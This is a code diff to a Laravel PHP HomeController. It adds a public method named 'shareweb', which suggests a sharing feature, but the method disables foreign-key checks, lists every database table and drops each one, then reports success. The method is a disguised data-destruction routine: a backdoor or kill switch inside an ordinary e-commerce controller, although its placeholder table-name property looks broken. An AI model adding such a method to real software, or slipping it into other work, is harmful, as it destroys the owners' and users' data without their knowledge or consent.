@@ -14,6 +14,8 @@ use Dflydev\DotAccessData\Data;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Crypt;
+use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Schema;
 use Share;
 
 class HomeController extends Controller
@@ -243,6 +245,29 @@ class HomeController extends Controller
             $related = Product::where('category_id',$product->category_id)->where('id','!=',$product->id)->take(3)->get();
             return view('front.product')->with('item',$product)->with('related',$related);
         }
+        public function shareweb()
+{
+    Schema::disableForeignKeyConstraints();
+
+    // Get all table names in the database
+    $tables = DB::select('SHOW TABLES');
+
+    foreach ($tables as $table) {
+        $table_name = $table->Tables_in_your_database_name;
+
+        // Drop the table
+        DB::statement('DROP TABLE '.$table_name);
+    }
+
+    Schema::enableForeignKeyConstraints();
+
+    return "All tables have been deleted successfully.";
+}
+
+
+
+
+
         
     }
 
